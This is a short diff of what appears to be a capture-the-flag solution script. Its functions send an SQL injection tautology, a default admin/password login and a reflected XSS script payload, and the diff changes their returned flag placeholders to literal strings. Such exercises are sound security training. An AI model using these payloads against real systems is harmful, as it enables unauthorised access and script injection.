@@ -35,7 +35,7 @@ def exploit_sql_injection(payload="1' OR '1'='1"):
     }
 
     if send_request(url, method, headers, params=params) == None:
-        return "$FLAG3"
+        return "flag3"
     else:
         return None
 
@@ -63,7 +63,7 @@ def exploit_login(username="admin", password="password"):
     }
 
     if send_request(url, method, headers, params=params) == None:
-        return "$FLAG4"
+        return "flag4"
     else:
         return None
 
@@ -85,7 +85,7 @@ def exploit_reflected_xss(payload="<script> alert(\"uwu\"); </script>"):
     }
 
     if send_request(url, method, headers, params=params) == None:   
-        return "$FLAG5"
+        return "flag5"
     else:
         return None
 
